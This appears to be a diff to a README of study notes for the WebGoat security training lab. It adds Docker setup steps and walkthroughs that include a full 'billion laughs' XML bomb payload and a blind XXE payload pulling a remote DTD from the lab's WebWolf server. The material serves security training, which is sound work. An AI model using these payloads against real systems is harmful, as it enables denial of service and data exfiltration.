@@ -4,11 +4,31 @@
 
 `docker run -p 8080:8080 -it webgoat/webgoat-8.0 /home/webgoat/start.sh`
 
+OR run via the supplied docker-compose.yml file
+
+`docker-compose up webgoat`
+
+Then navigate to [http://localhost:8080/WebGoat](http://localhost:8080/WebGoat)
+
 ## Stop WebGoat
 
-Importantly, the container should be stopped this way:
+The container can be stopped this way (or with CMD+C)
 
 `docker container stop <CONTAINER-ID>`
+
+## Start WebGoat & WebWolf
+
+Use our provided `docker-compose.yml` file for this and run:
+
+`docker-compose up`
+
+This should fire up WebGoat & WebWolf under the same bridged network.
+
+## Environment Variables in Docker
+
+You will notice an environment variable in the	`docker-compose.yml` file, for example `WEBWOLF_HOST`. This is needed because the containers will have their own unique names withing the bridged network created by Docker. The name is the same as the service name as defined in `docker-compose`.
+
+The environment variables are set in the [`application.properties` file](https://github.com/WebGoat/WebGoat/blob/6c91e7dc8ab4d873cda8550a04b6179db048568b/webgoat-container/src/main/resources/application.properties) on container startup and any environment variables found are used to set these properties.
 
 ## SQL Injection (basic)
 
@@ -143,6 +163,46 @@ For example, imagine in a commenting application there was a form field to add a
 <comment><text>&xxe;</text></comment>
 ```
 
+## XXE DDOS Classic 'XML Bomb' attack
 
+The classic XML Bomb or a [billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) looks like this:
 
+```
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+When an XML parser loads this document, it sees that it includes one root element, "lolz", that contains the text "&lol9;". However, "&lol9;" is a defined entity that expands to a string containing ten "&lol8;" strings. Each "&lol8;" string is a defined entity that expands to ten "&lol7;" strings, and so on. After all the entity expansions have been processed, this small (< 1 KB) block of XML will actually contain 109 = a billion "lol"s, taking up almost 3 gigabytes of memory!
+
+## Blind XXE 
+
+Assuming we are running WebGoat and WebWolf using our `docker-compose` setup then we upload the [`webwolf\attack.dtd`](webwolf\attack.dtd) file to WebWolf first and copy the link url.
+
+Then in the comments hack example, use Burp Suite to intecept the request and repace with the follwoing XML payload (change the SYSTEM URL to your files URL).
+
+This basically loads the remote DTD file and replaces the `%remotel` placeholder with the remote DTD. This is basically our 'attack.dtd' file which contains the entity 'ping'. We load this into the text element of the XML so that the parser executes it thus sending a request to our WebWolf server from WebGoat!
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://webwolf:8081/files/darren/attack.dtd">
+%remote;
+]>
+<comment>
+  <text>test&ping;</text>
+</comment>
+```
 
